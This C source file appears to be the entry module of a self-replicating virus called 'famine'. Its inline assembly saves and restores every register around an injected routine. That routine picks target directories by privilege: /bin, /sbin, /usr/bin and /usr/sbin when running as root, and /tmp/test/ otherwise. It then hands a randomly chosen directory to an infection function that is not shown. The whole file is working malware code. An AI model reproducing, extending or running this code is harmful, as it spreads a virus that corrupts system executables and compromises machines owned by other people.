#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// BOOTSTRAP FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	constructor();
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void launch(struct directory *dir, const size_t size, const int trace)
{
	size_t m_entry = 0;
	char dirent[BUFF_SIZE];

	for (unsigned char index = 0; index < size; index++)
	{
		update_dirent(dirent, dir[index].path);
		update_directory(&dir[index], dirent);
		m_entry += dir[index].entry;

		if (dir[index].entry == 0)
			Exit(0);
	}

	famine(dir[_get_random_integer(size)].path, m_entry, trace);
}

static void entry(void)
{
	int trace = _open("/tmp/trace", O_WRONLY | O_CREAT | O_APPEND, 0644);

	struct directory user[] =
	{
		(struct directory){"/tmp/test/", 0},
	};
	struct directory root[] =
	{
		(struct directory){"/bin/", 0},
		(struct directory){"/sbin/", 0},
		(struct directory){"/usr/bin/", 0},
		(struct directory){"/usr/sbin/", 0},
	};

	if (_getuid() == 0)
		launch(root, sizeof(root) / sizeof(root[0]), trace);
	else
		launch(user, sizeof(user) / sizeof(user[0]), trace);

	_close(trace);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void constructor(void)
{
	__asm__ volatile (
			"push rbx\n"
			"push rsp\n"
			"push rbp\n"
			"push rax\n"
			"push rdi\n"
			"push rsi\n"
			"push rdx\n"
			"push rcx\n"
			"push r8\n"
			"push r9\n"
			"push r10\n"
			"push r11\n"
			"push r12\n"
			"push r13\n"
			"push r14\n"
			"push r15\n"
			);

	entry();

	__asm__ volatile (
			"pop r15\n"
			"pop r14\n"
			"pop r13\n"
			"pop r12\n"
			"pop r11\n"
			"pop r10\n"
			"pop r9\n"
			"pop r8\n"
			"pop rcx\n"
			"pop rdx\n"
			"pop rsi\n"
			"pop rdi\n"
			"pop rax\n"
			"pop rbp\n"
			"pop rsp\n"
			"pop rbx\n"
			);

	__asm__ volatile (
			"jmp L1\n"
			);
	__asm__ volatile (
			"L1:\n"
			);
}
